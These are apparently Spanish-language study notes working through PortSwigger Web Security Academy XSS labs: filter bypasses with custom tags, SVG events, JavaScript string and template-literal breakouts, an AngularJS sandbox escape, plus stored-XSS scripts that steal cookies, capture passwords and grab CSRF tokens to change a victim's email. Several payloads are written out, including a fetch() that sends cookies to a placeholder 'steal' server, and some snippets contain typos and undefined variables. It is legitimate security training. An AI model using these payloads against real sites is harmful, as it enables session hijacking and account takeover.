Utilizamos un servidor de explotación para construir un vector que incluye una etiqueta inventada, con un identificador específico y un evento que se activa al enfocar ese elemento. Al añadir un fragmento al final de la URL que apunta a esa etiqueta personalizada, el navegador intenta enfocarla automáticamente al cargar la página, lo que desencadena la ejecución del código malicioso sin necesidad de interacción del usuario.

Este laboratorio demuestra cómo incluso etiquetas no estándar pueden ser vehículos válidos para ataques XSS si los atributos y eventos no son controlados adecuadamente, reforzando la importancia de validar todo el contenido, no solo el nombre de la etiqueta.


## Laboratorio: XSS reflejado en contexto HTML con todas las etiquetas bloqueadas excepto las personalizadas
PRACTICANTE

LAB
No resuelto
Este laboratorio bloquea todas las etiquetas HTML excepto las personalizadas.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte una etiqueta personalizada y alerte automáticamente document.cookie.


<iframe src="https://0a4100f10338f6c9807203ee00c900d6.web-security-academy.net/?search=<xss autofocus onfocus=alert(document.cookie) tabindex=1></xss>"></iframe>



location.href='https://0a4100f10338f6c9807203ee00c900d6.web-security-academy.net/?search='+encodeURIComponent(document.cookie)



<custom-tag onfocus="alert(document.cookie); location.href='https://0a4100f10338f6c9807203ee00c900d6.web-security-academy.net/?search='+encodeURIComponent(document.cookie)" autofocus tabindex=1></custom-tag>


<script>
location='https://0a4100f10338f6c9807203ee00c900d6.web-security-academy.net/?search=<etiqueta  id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>










# XSS reflejado con etiquetas SVG permitidas
En esta clase trabajamos con un entorno de XSS reflejado donde la mayoría de etiquetas HTML estándar están bloqueadas, pero algunas relacionadas con SVG aún están permitidas, incluyendo ciertos eventos compatibles con esa tecnología.

La vulnerabilidad está en el buscador, que refleja la entrada del usuario directamente en la respuesta. Aunque intentos típicos de inyección son bloqueados, realizamos un análisis sistemático usando Burp Intruder para descubrir qué etiquetas y atributos aún son aceptados por el sistema.

Tras probar múltiples combinaciones, identificamos que algunas etiquetas del entorno SVG, como svg y animatetransform, junto con eventos como onbegin, no son filtradas y permiten la ejecución de código al momento de cargarse la página.

Aprovechamos esto para construir un vector que, sin intervención del usuario, desencadena una función en el navegador al iniciarse la animación SVG, completando con éxito el laboratorio.

Este caso demuestra cómo incluso los entornos con filtros activos pueden ser vulnerables si se dejan rutas menos comunes abiertas, como el espacio SVG, y destaca la importancia de validar tanto etiquetas como atributos y eventos asociados.


## Laboratorio: XSS reflejado con algún marcado SVG permitido
PRACTICANTE

LAB
No resuelto
Este laboratorio tiene una vulnerabilidad XSS reflejada simple. El sitio bloquea etiquetas comunes pero omite algunas etiquetas y eventos SVG.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert() función.




<svg><desc></desc><script>alert(1)</script></svg>


### Buscar las etuiquetas en el INTRUDER

8	animatetransform	200	636	false	false	3281	
65	image	200	412	false	false	6423	


<svg>
  <animateTransform 
    attributeName="transform" 
    type="scale" 
    from="1" 
    to="2" 
    begin="0s" 
    onbegin="alert(document.cookie)" 
    dur="1s"
  />
</svg>



<svg>
  <animateTransform 
    onbegin="alert(0)" 
  />
</svg>



<svg>
  <animateTransform
    attributeName="transform"
    begin="0s"
    onbegin="fetch('https://tu-servidor.com/steal?cookie='+encodeURIComponent(document.cookie))"
    dur="0.1s"
  />
</svg>










# XSS reflejado en etiqueta canonical
En esta clase trabajamos con un XSS reflejado poco convencional, donde el punto vulnerable es una etiqueta utilizada para definir la URL canónica de la página. Aunque el sistema filtra los signos angulares para evitar aperturas de etiquetas nuevas, permite la inyección de atributos dentro de una etiqueta existente.

Aprovechamos este comportamiento para insertar atributos como accesskey y onclick, que nos permiten asociar una acción concreta —en este caso, la ejecución de código— a una combinación específica de teclas.

El exploit se construye de forma que, al presionar una combinación como Alt+Shift+X, el navegador dispare un evento que ejecuta la función deseada. Aunque no ocurre de forma automática al cargar la página, se considera válida ya que no requiere interacción directa con el contenido visible ni clics por parte del usuario.

Este laboratorio demuestra cómo atributos aparentemente inofensivos pueden ser utilizados como vectores de ejecución, y cómo el contexto de inyección —incluso en elementos como enlaces— puede tener implicaciones de seguridad si no se controla adecuadamente.


## Laboratorio: XSS reflejado en la etiqueta de enlace canónico
PRACTICANTE

LAB
No resuelto
Este laboratorio refleja la entrada del usuario en una etiqueta de enlace canónica y escapa de los corchetes angulares.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios en la página de inicio que inyecte un atributo que llame al alert función.

Para ayudarle con su exploit, puede asumir que el usuario simulado presionará las siguientes combinaciones de teclas:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X
Tenga en cuenta que la solución prevista para este laboratorio solo es posible en Chrome.


view-source:https://0a9f004f03f65bb6807d08b500ed007c.web-security-academy.net/?' accesskey='x' onclick='alert(1)


https://0a9f004f03f65bb6807d08b500ed007c.web-security-academy.net/?%27%20accesskey=%27x%27%20onclick=%27alert(1)









# XSS en string JS con comilla y backslash escapados
En esta clase abordamos un XSS reflejado que se produce dentro de una cadena de texto en un bloque de JavaScript. El valor de entrada del usuario es reflejado en una variable delimitada por comillas simples, y tanto estas comillas como las barras invertidas están escapadas para dificultar la inyección.

Al intentar romper la cadena directamente, observamos que los caracteres clave quedan neutralizados, impidiendo ejecutar código dentro del mismo contexto. La estrategia, entonces, consiste en cerrar la etiqueta de script actual e insertar una nueva, completamente separada, que contenga la instrucción maliciosa.

De este modo, el contenido inyectado no depende de romper la cadena desde dentro, sino de interrumpir el bloque de código y generar uno nuevo fuera del contexto protegido. El navegador interpreta esta estructura como válida, permitiendo la ejecución de la función deseada.

Este laboratorio enseña una técnica de evasión muy útil para entornos donde los caracteres de escape son aplicados, pero el análisis del contexto permite insertar etiquetas completas que se interpretan igualmente como ejecutables por el navegador.


## Laboratorio: XSS reflejado en una cadena JavaScript con comillas simples y barra invertida escapada
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de seguimiento de consultas de búsqueda. La reflexión ocurre dentro de una cadena de JavaScript con comillas simples y barras invertidas escapadas.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que se salga de la cadena JavaScript y llame al alert función.

a';alert(1);//


- Contiene: espacio + cierre de script + nuevo script con alerta + comentario
- El </script> cierra el script actual prematuramente
- <script>alert(1) inicia un nuevo script malicioso
- // comenta el resto del código original



'</script><script>alert(1);//

'</script><script>alert(1);</script> 



<script>
var searchTerms = ' '</script><script>alert(1);// ';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>






Composición del payload:

- M4rdukwasH3re: Texto arbitrario de camuflaje
- \\\\\': Cuatro backslashes y una comilla simple

En JavaScript, \\\\ se convierte en \\ (dos backslashes literales)
- \' se convierte en ' (comilla simple escapada)
- -alert(1): Código malicioso a inyectar
- //: Comentario para neutralizar el resto de la línea


M4rdukwasH3re\\'-alert(1)//


<script>
var searchTerms = 'M4rdukwasH3re\\\\\'-alert(1)//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>







# XSS en JS con comillas, corchetes y comilla escapada
En esta clase analizamos un XSS reflejado que ocurre dentro de una cadena de texto en JavaScript. El valor reflejado del buscador se inserta en una variable delimitada por comillas simples. En este caso, las comillas simples están escapadas correctamente, y tanto los signos angulares como las comillas dobles están codificados como entidades HTML.

Sin embargo, la clave está en que las barras invertidas no se escapan, lo que nos permite introducir una de forma manual y romper el contexto de la cadena desde fuera.

Aprovechamos esta debilidad insertando una barra invertida seguida de una comilla escapada que finaliza la cadena, y después inyectamos una instrucción directa, separándola del código original con un operador y comentarios para evitar errores de sintaxis.

Este laboratorio muestra cómo es posible evadir filtros mixtos —HTML y JavaScript— si se detecta un punto débil en alguno de los mecanismos de escape, como en este caso con las barras invertidas no gestionadas correctamente.


## Laboratorio: XSS reflejado en una cadena JavaScript con corchetes angulares y comillas dobles codificadas en HTML y comillas simples escapadas
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de seguimiento de consultas de búsqueda, donde los corchetes angulares y los dobles están codificados en HTML y se escapan las comillas simples.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que se salga de la cadena JavaScript y llame al alert función.



<script>
var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>





\\\';-alert(1)//test

\\';-alert(1)//test











# XSS almacenado en ‘onclick’ con codificación completa
En esta clase trabajamos con un XSS almacenado que afecta al campo de sitio web del sistema de comentarios. Este valor es posteriormente utilizado dentro de un manejador de eventos del tipo onclick asociado al nombre del autor del comentario.

El sistema aplica múltiples medidas de protección: codifica los signos angulares y las comillas dobles como entidades HTML, y además escapa tanto las comillas simples como las barras invertidas. Sin embargo, al observar cuidadosamente cómo se construye el atributo, descubrimos que aún podemos romper la estructura si inyectamos un valor cuidadosamente diseñado.

Utilizamos un valor de URL que contiene una secuencia manipulada para cerrar el contexto del atributo y ejecutar una función directamente. El carácter de escape que normalmente neutralizaría la comilla es absorbido por la estructura de la URL, permitiendo que el código se ejecute al hacer clic sobre el nombre del autor.

Este laboratorio enseña cómo incluso con múltiples capas de filtrado, pueden encontrarse formas de romper el contexto si se entiende cómo se evalúan los caracteres especiales en combinación con el navegador.


## Laboratorio: XSS almacenado en onclick evento con corchetes angulares y comillas dobles codificadas en HTML y comillas simples y barra invertida escapada
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios.

Para resolver este laboratorio, envíe un comentario que llame al alert función cuando se hace clic en el nombre del autor del comentario.


 <input pattern="(http:|https:).+" type="text" name="website">


<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            
<a id="author" href="https://cdssass.com" onclick="var tracker={track(){}};tracker.track('https://cdssass.com');">test</a> | 07 August 2025
</p>
<p>test</p>
<p></p>
</section>



https://cdssass.com&apos;+alert(1)+&apos;










# XSS en template literal con caracteres unicode escapados
En esta clase abordamos un XSS reflejado que ocurre dentro de una cadena de plantilla de JavaScript —también conocida como template literal—, donde el valor introducido por el usuario se refleja en tiempo de ejecución dentro de un fragmento delimitado por comillas invertidas.

El sistema aplica un filtrado agresivo que codifica signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas, bloqueando así inyecciones clásicas. Sin embargo, no restringe las expresiones contenidas entre el símbolo de dólar y llaves, que son interpretadas como código ejecutable dentro de la plantilla.

Aprovechamos esta brecha introduciendo una expresión que se evalúa directamente al cargar la página, sin necesidad de romper el delimitador original. Al estar el contenido ya dentro de una cadena ejecutable, el navegador interpreta la expresión de inmediato y ejecuta la función deseada.

Este laboratorio demuestra cómo las cadenas de plantilla pueden ser un punto crítico de inyección si no se filtran expresiones embebidas, y destaca la importancia de neutralizar todos los elementos interpretables dentro de estructuras modernas de JavaScript.


## Laboratorio: XSS reflejado en una plantilla literal con corchetes angulares, comillas simples, dobles, barra invertida y comillas invertidas con escape Unicode
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad del blog de búsqueda. La reflexión ocurre dentro de una cadena de plantilla con corchetes angulares, comillas simples y dobles codificadas en HTML y comillas invertidas escapadas. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función dentro de la cadena de plantilla.







<script>
var message = `0 search results for '\u003cscript\u003ealert(1)\u003c/script\u003e'`;
document.getElementById('searchMessage').innerText = message;
</script>


console.log(`mensaje de: ${mensaje}`) 
VM247:1 mensaje de: probando



console.log('mensaje de: ${mensaje}') 
mensaje de: ${mensaje}

console.log('mensaje de: ${alert(0)}'); 

console.log(`mensaje de: ${alert(0)}`); 




- ${alert(0)}








# Robo de cookies mediante XSS
En esta clase ponemos en práctica un caso realista de XSS almacenado con robo de sesión, donde el código malicioso se inyecta en un comentario de blog y se activa cuando otro usuario —en este caso, una víctima simulada— visualiza la página.

Aprovechamos la vulnerabilidad para insertar un fragmento de código que, al ejecutarse en el navegador de la víctima, recopila su cookie de sesión y la envía en segundo plano a un servidor externo controlado a través de Burp Collaborator, una herramienta diseñada para capturar interacciones fuera de banda.

Una vez interceptada la cookie, la utilizamos para suplantar la identidad del usuario afectado, inyectándola en nuestras propias peticiones mediante un proxy o el módulo Repeater de Burp Suite. Esto nos da acceso a áreas privadas como si fuéramos la víctima.

Este laboratorio demuestra cómo un XSS puede ir más allá de una simple alerta visual y usarse para comprometer directamente cuentas de usuario, lo que lo convierte en uno de los vectores más críticos en seguridad web.

## Laboratorio: Explotación de secuencias de comandos entre sitios para robar cookies
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para exfiltrar la cookie de sesión de la víctima y luego use esta cookie para hacerse pasar por la víctima.

Nota
Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debes utilizar el servidor público predeterminado de Burp Collaborator.

Algunos usuarios notarán que existe una solución alternativa a este laboratorio que no requiere Burp Collaborator. Sin embargo, es mucho menos sutil que exfiltrar la galleta.


### Con BurpSuite Collaborator Profesional

<script>
  fecth("/?cookie="+btoa(document.cookie))
</script>


echo -n 'cookie' | base64 -d; echo  













# Captura de contraseñas mediante XSS
En esta clase llevamos el XSS almacenado un paso más allá, enfocándonos en capturar las credenciales de un usuario legítimo en lugar de solo su cookie de sesión. El entorno vulnerable es un sistema de comentarios donde el código inyectado queda persistente y se ejecuta cuando un visitante visualiza el contenido.

Aprovechamos esta oportunidad para insertar campos de entrada personalizados en el comentario, imitando elementos ya existentes en la página. Añadimos un evento que, cuando el usuario introduce su contraseña, intercepta el valor junto con su nombre de usuario y los envía automáticamente al servidor público de Burp Collaborator.

Una vez que recibimos esta información en el panel de Collaborator, podemos utilizar las credenciales capturadas para iniciar sesión como la víctima, accediendo así directamente a su cuenta.

Este laboratorio demuestra cómo el XSS puede emplearse para técnicas de credential harvesting, especialmente cuando se combinan con ingeniería social y campos camuflados. También refuerza la importancia de tratar todo contenido generado por usuarios como potencialmente malicioso.


Laboratorio: Explotación de secuencias de comandos entre sitios para capturar contraseñas
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, aproveche la vulnerabilidad para exfiltrar el nombre de usuario y la contraseña de la víctima y luego use estas credenciales para iniciar sesión en la cuenta de la víctima.

Nota
Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debes utilizar el servidor público predeterminado de Burp Collaborator.

Algunos usuarios notarán que existe una solución alternativa a este laboratorio que no requiere Burp Collaborator. Sin embargo, es mucho menos sutil que exfiltrar las credenciales.



### Con BurpSuite Collaborator Profesional














# Evasión de CSRF usando XSS [1/2]

En esta clase explotamos un XSS almacenado para ejecutar una acción que normalmente estaría protegida por medidas anti-CSRF. La aplicación permite insertar comentarios maliciosos que se ejecutan cuando otro usuario visita el blog, lo que nos permite acceder a sus sesiones activas y realizar acciones en su nombre.

Nuestro objetivo es cambiar la dirección de correo electrónico del usuario afectado. Para ello, necesitamos primero obtener el token CSRF válido que protege dicha operación. Aprovechamos el XSS para hacer una petición al área de configuración de cuenta, capturar el contenido de la respuesta y extraer el token desde el HTML.

Una vez que tenemos el token, generamos una segunda petición desde el navegador de la víctima, enviando el token y la nueva dirección de correo. Como todo ocurre dentro de su propia sesión, la operación se realiza con éxito.

Este laboratorio demuestra cómo un XSS puede romper las defensas de tipo CSRF y subraya la importancia de que los tokens no solo estén presentes, sino que también estén correctamente aislados del acceso por parte de scripts inyectados.

 


### Laboratorio: Explotación de XSS para eludir las defensas CSRF
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Para resolver el laboratorio, explota la vulnerabilidad para robar un token CSRF, que luego puedes usar para cambiar la dirección de correo electrónico de alguien que vea los comentarios de la publicación del blog.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: 
            
              wiener :peter


<script>
  var req=XMLHttpRequest();
  req.open("GET","/my-account",false)
  req.send();
  var respnse = req.responseText;
  var csrf_token = response.match(/name="csrf" value=*(.*?)*/)[1];
  var req2=XMLHttpRequest();
  req2.open("GET","http://_?token=" +btoa(csrf_token));
  req2.send();
</script>


echo -n 'cookie' | base64 -d; echo  







------------------forma 2



<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>




-----Formulario

@ --> %40


Leave a comment
Comment:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test%40test.com')
};
</script>
Name:
test1
Email:
mexed18326@mcenb.com
Website:
https://test1.com








POST /my-account/change-email HTTP/2
Host: 0a0200cc032e79fe805e26c100d30074.web-security-academy.net
Cookie: session=3ad392RC0TzVEaN4sKC1hHVBYwy9tPeV
Content-Length: 65
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a0200cc032e79fe805e26c100d30074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0200cc032e79fe805e26c100d30074.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=testing@testing.com&csrf=QsYcO0AB3a5cWKbUecRR0V7T7NF55lH3





------------------forma 3


<script>
  var req=XMLHttpRequest();
  req.open("GET","/my-account",false)
  req.send();
  var respnse = req.responseText;
  var csrf_token = response.match(/name="csrf" value=*(.*?)*/)[1];
  var req2=XMLHttpRequest();
  req2.open('post', '/my-account/change-email', true);
  req2.setRequestHeader("Content-Type: application/x-www-form-urlencoded");
  var data = 'email='+encodeURIComponent('test@test.com')+'&csrf='+encodeURIComponent(token);
  req2.send()
</script>








--Vesrion mejorada

<script>
  // Obtener el token CSRF de la página de la cuenta
  var request = new XMLHttpRequest();
  request.open("GET", "/my-account", false); // Sincrónico (no recomendado en producción)
  request.send();
  
  // Verificar que la respuesta sea exitosa
  if (request.status === 200) {
    var response = request.responseText;
    
    // Extraer el token CSRF de forma más robusta
    var csrfMatch = response.match(/name="csrf" value="([^"]+)"/);
    
    if (csrfMatch && csrfMatch[1]) {
      var csrfToken = csrfMatch[1];
      
      // Enviar la petición para cambiar el email
      var changeRequest = new XMLHttpRequest();
      changeRequest.open('POST', '/my-account/change-email', true);
      changeRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      
      // Codificar los parámetros para seguridad
      var postData = 'email=' + encodeURIComponent('test@test.com') + 
                    '&csrf=' + encodeURIComponent(csrfToken);
      
      changeRequest.send(postData);
    } else {
      console.error("No se pudo encontrar el token CSRF");
    }
  } else {
    console.error("Error al cargar la página de cuenta:", request.status);
  }
</script>s











# Escape de sandbox AngularJS sin cadenas [1/2]
En esta clase de nivel ‘experto’, trabajamos con una vulnerabilidad de ‘XSS reflejado’ en una aplicación que utiliza AngularJS con restricciones avanzadas. La inyección ocurre dentro de una expresión Angular, pero el entorno está configurado para evitar el uso de ‘eval’ y bloquear por completo cualquier intento de utilizar cadenas de texto.

El enfoque consiste en usar funciones nativas de JavaScript para construir cadenas de forma indirecta. Aprovechamos el método ‘toString()‘ y la propiedad ‘constructor‘ para acceder al prototipo de los objetos y redefinir cómo se comportan. En concreto, se sobrescribe el método ‘charAt‘ del prototipo de las cadenas, lo que permite eludir el sistema de seguridad interno de AngularJS.

Luego pasamos una expresión al filtro ‘orderBy‘, y generamos el código deseado utilizando ‘fromCharCode‘ con los valores numéricos correspondientes a los caracteres de la cadena ‘x=alert(1)‘. Como hemos alterado el comportamiento interno de las cadenas, AngularJS permite que esta expresión se ejecute donde normalmente estaría bloqueada.

Este laboratorio demuestra cómo es posible romper entornos supuestamente seguros mediante manipulación de bajo nivel, sin depender de comillas o funciones evaluadoras explícitas.

## Laboratorio: XSS reflejado con escape de sandbox Angularjs sin cuerdas
EXPERTO

LABORATORIO
No resuelto
Este laboratorio utiliza AngularJS de una manera inusual donde la función $ eval no está disponible y no podrá usar ninguna cadena en AngularJS.

Para resolver el laboratorio, realice un ataque de secuencias de comandos de sitios cruzados que escape del sandbox y ejecute la función de alerta sin usar la función $ eval.





/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1